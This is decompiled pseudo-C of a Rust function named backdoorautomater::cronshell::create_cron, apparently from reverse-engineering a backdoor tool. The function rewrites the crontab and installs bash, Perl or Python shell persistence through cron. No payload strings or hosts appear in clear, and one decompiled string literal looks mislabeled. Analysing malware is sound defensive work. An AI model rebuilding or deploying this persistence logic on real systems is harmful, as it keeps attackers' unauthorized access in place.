code * _ZN17backdoorautomater9cronshell11create_cron17h656d414225364c9cE
                 (long *param_1,long *param_2,undefined8 *param_3,undefined8 *param_4,uint param_5,
                 long param_6)

{
  bool bVar1;
  int iVar2;
  undefined8 uVar3;
  code *pcVar4;
  uint uVar5;
  undefined *puVar6;
  char cVar7;
  uint uVar8;
  int local_2ec;
  undefined8 local_2e8;
  undefined8 uStack_2e0;
  undefined8 local_2d8;
  undefined4 uStack_2d0;
  undefined4 uStack_2cc;
  undefined4 local_2c8;
  undefined4 uStack_2c4;
  undefined4 uStack_2c0;
  undefined4 uStack_2bc;
  undefined8 local_2b8;
  undefined4 local_2a8;
  undefined4 uStack_2a4;
  undefined4 uStack_2a0;
  undefined4 uStack_29c;
  undefined8 *local_298;
  long *local_288;
  uint local_27c;
  undefined8 local_278;
  undefined8 uStack_270;
  undefined8 *local_268;
  long *local_240;
  undefined4 local_238;
  undefined4 uStack_234;
  undefined4 uStack_230;
  undefined4 uStack_22c;
  undefined4 local_228;
  undefined4 uStack_224;
  undefined4 uStack_220;
  undefined4 uStack_21c;
  undefined4 local_218;
  undefined4 uStack_214;
  undefined4 uStack_210;
  undefined4 uStack_20c;
  undefined8 local_208;
  long local_200;
  undefined4 local_1f8;
  undefined4 uStack_1f4;
  undefined4 uStack_1f0;
  undefined4 uStack_1ec;
  undefined8 *local_1e8;
  undefined8 *local_1e0;
  undefined8 local_1d8;
  undefined8 uStack_1d0;
  undefined8 *local_1c8;
  undefined8 uStack_1c0;
  undefined8 uStack_1b8;
  undefined8 local_1b0;
  undefined8 *local_100;
  undefined4 local_f8;
  undefined4 uStack_f4;
  undefined4 uStack_f0;
  undefined4 uStack_ec;
  undefined8 *local_e8;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined local_c0 [8];
  undefined8 local_b8;
  undefined8 local_b0;
  undefined4 local_a8;
  undefined4 uStack_a4;
  undefined4 uStack_a0;
  undefined4 uStack_9c;
  undefined8 *local_98;
  undefined local_90 [24];
  undefined8 *local_78;
  code *local_70;
  undefined8 *local_68;
  undefined4 local_60;
  undefined4 uStack_5c;
  undefined4 uStack_58;
  undefined4 uStack_54;
  undefined8 *local_50;
  undefined8 uStack_48;
  undefined8 local_40;
  undefined8 uStack_38;
  
  local_1d8 = (undefined **)param_3[1];
  uStack_1d0 = (code *)(param_3[2] + (long)local_1d8);
  local_288 = param_2;
  local_240 = param_1;
  local_200 = param_6;
  local_1e0 = param_3;
  local_100 = param_4;
  iVar2 = _ZN96__LT_core__str__iter__Chars_u20_as_u20_core__iter__traits__double_ended__DoubleEndedIterator_GT_9next_back17h6ef03064f47cabe8E
                    (&local_1d8);
  if ((iVar2 != 0x2f) && (iVar2 != 0x110000)) {
                    /* try { // try from 00161993 to 0016199f has its CatchHandler @ 00162827 */
    _ZN5alloc6string6String4push17h8dfcd488d6c0f12bE(local_1e0);
  }
  local_1c8 = (undefined8 *)local_1e0[2];
  local_1d8 = (undefined **)*local_1e0;
  uStack_1d0 = (code *)local_1e0[1];
  uStack_1c0 = *local_100;
  uStack_1b8 = local_100[1];
  local_1b0 = local_100[2];
                    /* try { // try from 001619de to 001619ff has its CatchHandler @ 00162844 */
  _ZN5alloc3str17join_generic_copy17h6e3e6eb2fb0da332E(&local_278,&local_1d8,2,1,0);
  local_1e8 = local_268;
  local_1f8 = (undefined4)local_278;
  uStack_1f4 = local_278._4_4_;
  uStack_1f0 = (undefined4)uStack_270;
  uStack_1ec = uStack_270._4_4_;
                    /* try { // try from 00161a23 to 00161a42 has its CatchHandler @ 001628bd */
  _ZN4core3ptr63drop_in_place_LT__u5b_alloc__string__String_u3b__u20_2_u5d__GT_17hfd07afc6d277b85dE
            (&local_1d8);
  (*(code *)
    PTR__ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E_00368788
  )(local_90,local_288);
                    /* try { // try from 00161a46 to 00161a5b has its CatchHandler @ 00162896 */
  (*(code *)
    PTR__ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E_00368788
  )(local_c0,&local_1f8);
                    /* try { // try from 00161a5f to 00161a77 has its CatchHandler @ 0016289e */
  _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_1d8,&DAT_00267183,2);
                    /* try { // try from 00161a78 to 00161ad1 has its CatchHandler @ 001628c7 */
  uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_1d8,&DAT_00267185,2);
  uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(uVar3,&DAT_00267158,0x15);
  (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_278,uVar3);
  _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
            (&local_238,&local_278,&PTR_s_src_cronshell_rs_0032a8d8);
                    /* try { // try from 00161ad5 to 00161aff has its CatchHandler @ 001628b8 */
  _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_1d8);
  (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
            (&local_278,CONCAT44(uStack_214,local_218),CONCAT44(uStack_20c,uStack_210));
                    /* try { // try from 00161b00 to 00161b1c has its CatchHandler @ 001628a3 */
  uVar3 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                    (&local_278);
  _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
            (&local_1d8,uVar3);
  local_298 = local_1c8;
  local_2a8 = (int)local_1d8;
  uStack_2a4 = local_1d8._4_4_;
  uStack_2a0 = (undefined4)uStack_1d0;
  uStack_29c = uStack_1d0._4_4_;
                    /* try { // try from 00161b3a to 00161b9c has its CatchHandler @ 001628c2 */
  _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E(&local_278);
  _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_2a8);
  _ZN3std2fs4File4open17hf8beac8c391b568bE(&local_1d8,&DAT_002656b6,8);
  if ((int)local_1d8 == 0) {
    _ZN3std2io8buffered9bufreader18BufReader_LT_R_GT_13with_capacity17hfc22a243c8e8e3e1E
              (&local_60,0x2000,local_1d8._4_4_);
    local_d8 = 0;
    local_d0 = 8;
    local_c8 = 0;
    uStack_1b8 = local_40;
    local_1b0 = uStack_38;
    local_1c8 = local_50;
    uStack_1c0 = uStack_48;
    local_1d8 = (undefined **)CONCAT44(uStack_5c,local_60);
    uStack_1d0 = (code *)CONCAT44(uStack_54,uStack_58);
    local_27c = param_5;
                    /* try { // try from 00161c30 to 00161c8d has its CatchHandler @ 001628dc */
    while (_ZN82__LT_std__io__Lines_LT_B_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h114c8ea989dd5339E
                     (&local_278,&local_1d8), pcVar4 = uStack_270,
          local_278 != (undefined8 *)0x8000000000000001) {
      if (local_278 == (undefined8 *)0x8000000000000000) {
        _ZN4core3ptr103drop_in_place_LT_std__io__Lines_LT_std__io__buffered__bufreader__BufReader_LT_std__fs__File_GT__GT__GT_17hdb5dfe103db56feeE
                  (&local_1d8);
        bVar1 = true;
        goto LAB_00161f94;
      }
      local_78 = local_278;
      local_70 = uStack_270;
      local_68 = local_268;
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_d8,&local_78);
    }
                    /* try { // try from 00161c93 to 00161eb0 has its CatchHandler @ 0016282f */
    _ZN4core3ptr103drop_in_place_LT_std__io__Lines_LT_std__io__buffered__bufreader__BufReader_LT_std__fs__File_GT__GT__GT_17hdb5dfe103db56feeE
              (&local_1d8);
    uVar8 = local_27c & 0xff;
    cVar7 = (char)local_27c;
    if (cVar7 == '\x03') {
      local_2d8 = (undefined8 *)local_288[2];
      local_2e8 = (undefined *)*local_288;
      uStack_2e0 = (code *)local_288[1];
      local_268 = (undefined8 *)local_240[2];
      local_278 = (undefined8 *)*local_240;
      uStack_270 = (code *)local_240[1];
      local_1c8 = local_1e8;
      local_1d8 = (undefined **)CONCAT44(uStack_1f4,local_1f8);
      uStack_1d0 = (code *)CONCAT44(uStack_1ec,uStack_1f0);
      uVar3 = _ZN17backdoorautomater9cronshell16write_shell_bash17he63b55dff26362ccE
                        (&local_2e8,&local_278,&local_1d8);
LAB_00161e3c:
      uVar5 = 1;
      bVar1 = false;
      _ZN17backdoorautomater9sanitizer18sanitize_return_fn17hb2c462d03cd2292cE(uVar3);
    }
    else {
      if (uVar8 == 2) {
        local_2d8 = (undefined8 *)local_288[2];
        local_2e8 = (undefined *)*local_288;
        uStack_2e0 = (code *)local_288[1];
        local_268 = (undefined8 *)local_240[2];
        local_278 = (undefined8 *)*local_240;
        uStack_270 = (code *)local_240[1];
        local_1c8 = local_1e8;
        local_1d8 = (undefined **)CONCAT44(uStack_1f4,local_1f8);
        uStack_1d0 = (code *)CONCAT44(uStack_1ec,uStack_1f0);
        uVar3 = _ZN17backdoorautomater9cronshell16write_shell_perl17h0bdfc4dbe4ec353dE
                          (&local_2e8,&local_278,&local_1d8);
        goto LAB_00161e3c;
      }
      if (uVar8 == 1) {
        local_2d8 = (undefined8 *)local_288[2];
        local_2e8 = (undefined *)*local_288;
        uStack_2e0 = (code *)local_288[1];
        local_268 = (undefined8 *)local_240[2];
        local_278 = (undefined8 *)*local_240;
        uStack_270 = (code *)local_240[1];
        local_1c8 = local_1e8;
        local_1d8 = (undefined **)CONCAT44(uStack_1f4,local_1f8);
        uStack_1d0 = (code *)CONCAT44(uStack_1ec,uStack_1f0);
        uVar3 = _ZN17backdoorautomater9cronshell18write_shell_pyfile17hd91b0663228d4b31E
                          (&local_2e8,&local_278,&local_1d8);
        goto LAB_00161e3c;
      }
      bVar1 = true;
      uVar5 = 0;
    }
    local_1c8 = *(undefined8 **)(local_200 + 8);
    uStack_1c0 = *(undefined8 *)(local_200 + 0x10);
    local_1d8 = (undefined **)&DAT_002671a0;
    uStack_1d0 = (code *)0x2;
    _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_278,&local_1d8,2,1,0);
    local_e8 = local_268;
    local_f8 = (undefined4)local_278;
    uStack_f4 = local_278._4_4_;
    uStack_f0 = (undefined4)uStack_270;
    uStack_ec = uStack_270._4_4_;
                    /* try { // try from 00161ed1 to 00161f2f has its CatchHandler @ 0016280d */
    _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
              (&local_f8,&DAT_0026716d,9);
    if (cVar7 == '\x01') {
      uVar3 = 7;
      puVar6 = &DAT_00267176;
LAB_00161f10:
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_f8,puVar6,uVar3)
      ;
    }
    else if (uVar8 == 2) {
      uVar3 = 5;
      puVar6 = &DAT_0026717d;
      goto LAB_00161f10;
    }
    _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
              (&local_f8,local_b8,local_b0);
    local_1c8 = local_e8;
    local_1d8 = (undefined **)CONCAT44(uStack_f4,local_f8);
    uStack_1d0 = (code *)CONCAT44(uStack_ec,uStack_f0);
                    /* try { // try from 00161f50 to 00161f7d has its CatchHandler @ 001627fa */
    _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h3237d89e60f90e3aE(&local_d8,&local_1d8);
    _ZN3std2fs4File6create17hf69a1aea5d21dd7bE(&local_1d8,&DAT_002656b6,8);
    pcVar4 = uStack_1d0;
    if ((int)local_1d8 == 0) {
      local_2ec = local_1d8._4_4_;
      local_27c = uVar5;
      _ZN90__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__iter__traits__collect__IntoIterator_GT_9into_iter17h2e8f7014354aaec8E
                (&local_1d8,&local_d8);
      _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
                (&local_a8,&local_1d8);
      if (CONCAT44(uStack_a4,local_a8) != -0x8000000000000000) {
        do {
          local_2d8 = local_98;
          local_2e8 = (undefined *)CONCAT44(uStack_a4,local_a8);
          uStack_2e0 = (code *)CONCAT44(uStack_9c,uStack_a0);
                    /* try { // try from 001620aa to 001620b5 has its CatchHandler @ 0016285f */
          (*(code *)
            PTR__ZN60__LT_alloc__string__String_u20_as_u20_core__clone__Clone_GT_5clone17hb1e8eef355dde452E_00368788
          )(&local_278,&local_2e8);
                    /* try { // try from 001620b6 to 001620e1 has its CatchHandler @ 00162864 */
          _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                    (&local_278,&DAT_00267182,1);
          pcVar4 = (code *)_ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                     (&local_2ec,uStack_270,local_268);
          if (pcVar4 != (code *)0x0) {
                    /* try { // try from 00162639 to 00162645 has its CatchHandler @ 00162670 */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_278)
            ;
                    /* try { // try from 00162646 to 0016264f has its CatchHandler @ 0016266b */
            _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2e8)
            ;
                    /* try { // try from 00162650 to 0016265c has its CatchHandler @ 00162837 */
            _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                      (&local_1d8);
                    /* try { // try from 00162661 to 00162665 has its CatchHandler @ 00162777 */
            _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_2ec);
            goto LAB_00161fa1;
          }
                    /* try { // try from 001620ee to 001620f5 has its CatchHandler @ 0016285f */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_278);
                    /* try { // try from 001620f6 to 001620fd has its CatchHandler @ 00162822 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2e8);
          _ZN103__LT_alloc__vec__into_iter__IntoIter_LT_T_C_A_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h09279fcf7e353782E
                    (&local_a8,&local_1d8);
        } while (CONCAT44(uStack_a4,local_a8) != -0x8000000000000000);
      }
                    /* try { // try from 00162126 to 0016214b has its CatchHandler @ 00162837 */
      _ZN4core3ptr81drop_in_place_LT_alloc__vec__into_iter__IntoIter_LT_alloc__string__String_GT__GT_17h89d95cf2cdcb35ebE
                (&local_1d8);
      _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_1d8,&DAT_00267183,2);
                    /* try { // try from 0016214c to 001621a2 has its CatchHandler @ 001627e5 */
      uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_1d8,&DAT_00267185,2);
      uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(uVar3,&DAT_002671a2,10);
      (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_278,uVar3);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                (&local_2e8,&local_278,&PTR_s_src_cronshell_rs_0032a8f0);
                    /* try { // try from 001621a3 to 001621af has its CatchHandler @ 0016273e */
      _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(&local_238);
      local_208 = local_2b8;
      local_218 = local_2c8;
      uStack_214 = uStack_2c4;
      uStack_210 = uStack_2c0;
      uStack_20c = uStack_2bc;
      local_228 = (undefined4)local_2d8;
      uStack_224 = local_2d8._4_4_;
      uStack_220 = uStack_2d0;
      uStack_21c = uStack_2cc;
      local_238 = (undefined4)local_2e8;
      uStack_234 = local_2e8._4_4_;
      uStack_230 = (undefined4)uStack_2e0;
      uStack_22c = uStack_2e0._4_4_;
                    /* try { // try from 001621e4 to 0016220e has its CatchHandler @ 00162837 */
      _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_1d8);
      (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                (&local_278,CONCAT44(uStack_214,local_218),CONCAT44(uStack_20c,uStack_210));
                    /* try { // try from 0016220f to 0016222b has its CatchHandler @ 001627a6 */
      uVar3 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                        (&local_278);
      _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                (&local_1d8,uVar3);
      local_2d8 = local_1c8;
      local_2e8._0_4_ = SUB84(local_1d8,0);
      local_2e8._4_4_ = local_1d8._4_4_;
      uStack_2e0._0_4_ = SUB84(uStack_1d0,0);
      uStack_2e0._4_4_ = uStack_1d0._4_4_;
                    /* try { // try from 00162246 to 0016224f has its CatchHandler @ 00162725 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2a8);
      local_298 = local_2d8;
      local_2a8 = (undefined4)local_2e8;
      uStack_2a4 = local_2e8._4_4_;
      uStack_2a0 = (undefined4)uStack_2e0;
      uStack_29c = uStack_2e0._4_4_;
                    /* try { // try from 00162264 to 00162293 has its CatchHandler @ 00162837 */
      _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                (&local_278);
      _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_2a8);
      _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_1d8,&DAT_00267183,2);
                    /* try { // try from 00162294 to 001622ea has its CatchHandler @ 001627d0 */
      uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_1d8,&DAT_00267185,2);
      uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE
                        (uVar3,"crontab all_cron when inserting ",0x10);
      (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_278,uVar3);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                (&local_2e8,&local_278,&PTR_s_src_cronshell_rs_0032a908);
                    /* try { // try from 001622eb to 001622f7 has its CatchHandler @ 001626e9 */
      _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(&local_238);
      local_208 = local_2b8;
      local_218 = local_2c8;
      uStack_214 = uStack_2c4;
      uStack_210 = uStack_2c0;
      uStack_20c = uStack_2bc;
      local_228 = (undefined4)local_2d8;
      uStack_224 = local_2d8._4_4_;
      uStack_220 = uStack_2d0;
      uStack_21c = uStack_2cc;
      local_238 = (undefined4)local_2e8;
      uStack_234 = local_2e8._4_4_;
      uStack_230 = (undefined4)uStack_2e0;
      uStack_22c = uStack_2e0._4_4_;
                    /* try { // try from 0016232c to 00162356 has its CatchHandler @ 00162837 */
      _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_1d8);
      (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                (&local_278,CONCAT44(uStack_214,local_218),CONCAT44(uStack_20c,uStack_210));
                    /* try { // try from 00162357 to 00162373 has its CatchHandler @ 00162791 */
      uVar3 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                        (&local_278);
      _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                (&local_1d8,uVar3);
      local_2d8 = local_1c8;
      local_2e8._0_4_ = SUB84(local_1d8,0);
      local_2e8._4_4_ = local_1d8._4_4_;
      uStack_2e0._0_4_ = SUB84(uStack_1d0,0);
      uStack_2e0._4_4_ = uStack_1d0._4_4_;
                    /* try { // try from 0016238e to 00162397 has its CatchHandler @ 001626cd */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2a8);
      local_298 = local_2d8;
      local_2a8 = (undefined4)local_2e8;
      uStack_2a4 = local_2e8._4_4_;
      uStack_2a0 = (undefined4)uStack_2e0;
      uStack_29c = uStack_2e0._4_4_;
                    /* try { // try from 001623ac to 001623db has its CatchHandler @ 00162837 */
      _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                (&local_278);
      _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_2a8);
      _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_1d8,&DAT_00267183,2);
                    /* try { // try from 001623dc to 00162435 has its CatchHandler @ 001627bb */
      uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_1d8,&DAT_00267185,2);
      uVar3 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(uVar3,&DAT_002671ac,0xb);
      (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_278,uVar3);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                (&local_2e8,&local_278,&PTR_s_src_cronshell_rs_0032a920);
                    /* try { // try from 00162436 to 00162442 has its CatchHandler @ 00162691 */
      _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(&local_238);
      local_208 = local_2b8;
      local_218 = local_2c8;
      uStack_214 = uStack_2c4;
      uStack_210 = uStack_2c0;
      uStack_20c = uStack_2bc;
      local_228 = (undefined4)local_2d8;
      uStack_224 = local_2d8._4_4_;
      uStack_220 = uStack_2d0;
      uStack_21c = uStack_2cc;
      local_238 = (undefined4)local_2e8;
      uStack_234 = local_2e8._4_4_;
      uStack_230 = (undefined4)uStack_2e0;
      uStack_22c = uStack_2e0._4_4_;
                    /* try { // try from 00162477 to 001624a1 has its CatchHandler @ 00162837 */
      _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_1d8);
      (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                (&local_278,CONCAT44(uStack_214,local_218),CONCAT44(uStack_20c,uStack_210));
                    /* try { // try from 001624a2 to 001624be has its CatchHandler @ 0016277c */
      uVar3 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                        (&local_278);
      _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                (&local_1d8,uVar3);
      local_2d8 = local_1c8;
      local_2e8._0_4_ = SUB84(local_1d8,0);
      local_2e8._4_4_ = local_1d8._4_4_;
      uStack_2e0 = uStack_1d0;
                    /* try { // try from 001624d9 to 001624e2 has its CatchHandler @ 00162675 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2a8);
      local_298 = local_2d8;
      local_2a8 = (undefined4)local_2e8;
      uStack_2a4 = local_2e8._4_4_;
      uStack_2a0 = (undefined4)uStack_2e0;
      uStack_29c = uStack_2e0._4_4_;
                    /* try { // try from 001624f7 to 001625bd has its CatchHandler @ 00162837 */
      _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                (&local_278);
      _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_2a8);
      local_1d8 = &PTR_DAT_0032a938;
      uStack_1d0 = (code *)0x1;
      local_1c8 = (undefined8 *)0x8;
      uStack_1c0 = 0;
      uStack_1b8 = 0;
      (*(code *)PTR__ZN3std2io5stdio6_print17h9670eaecb29bc3fcE_00368b80)(&local_1d8);
      local_2e8 = local_90;
      uStack_270 = _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h79b96a6ad6630cecE;
      local_1d8 = &PTR_DAT_0032a948;
      uStack_1d0 = (code *)0x2;
      uStack_1b8 = 0;
      uStack_1c0 = 1;
      local_278 = &local_2e8;
      local_1c8 = &local_278;
      (*(code *)PTR__ZN3std2io5stdio6_print17h9670eaecb29bc3fcE_00368b80)(&local_1d8);
                    /* try { // try from 001625c2 to 001625c6 has its CatchHandler @ 00162777 */
      _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_2ec);
      uVar8 = local_27c;
                    /* try { // try from 001625cb to 001625d4 has its CatchHandler @ 001628b8 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2a8);
                    /* try { // try from 001625d5 to 001625e1 has its CatchHandler @ 0016289e */
      _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(&local_238);
                    /* try { // try from 001625e2 to 001625ee has its CatchHandler @ 00162896 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_c0);
                    /* try { // try from 001625ef to 001625fb has its CatchHandler @ 001628bd */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_90);
      if ((char)uVar8 == '\0') {
                    /* try { // try from 00162603 to 0016260f has its CatchHandler @ 00162827 */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1f8);
      }
                    /* try { // try from 00162610 to 0016261c has its CatchHandler @ 0016283c */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_200);
      if ((char)uVar8 != '\0') {
        return (code *)0x0;
      }
                    /* try { // try from 00162628 to 00162631 has its CatchHandler @ 001627fc */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_288);
      pcVar4 = (code *)0x0;
      goto LAB_00162003;
    }
LAB_00161f94:
                    /* try { // try from 00161f94 to 00161fa0 has its CatchHandler @ 001628c2 */
    _ZN4core3ptr65drop_in_place_LT_alloc__vec__Vec_LT_alloc__string__String_GT__GT_17h8814db29c860c5cdE
              (&local_d8);
  }
  else {
    bVar1 = true;
    pcVar4 = uStack_1d0;
  }
LAB_00161fa1:
                    /* try { // try from 00161fa1 to 00161faa has its CatchHandler @ 001628b8 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_2a8);
                    /* try { // try from 00161fab to 00161fb7 has its CatchHandler @ 0016289e */
  _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(&local_238);
                    /* try { // try from 00161fb8 to 00161fc4 has its CatchHandler @ 00162896 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_c0);
                    /* try { // try from 00161fc5 to 00161fd1 has its CatchHandler @ 001628bd */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_90);
  if (bVar1) {
                    /* try { // try from 00161fda to 00161fe6 has its CatchHandler @ 00162827 */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1f8);
  }
                    /* try { // try from 00161fe7 to 00161ff3 has its CatchHandler @ 0016283c */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_200);
  if (!bVar1) {
    return pcVar4;
  }
                    /* try { // try from 00161ff9 to 00162002 has its CatchHandler @ 001627fc */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_288);
LAB_00162003:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_240);
  return pcVar4;
}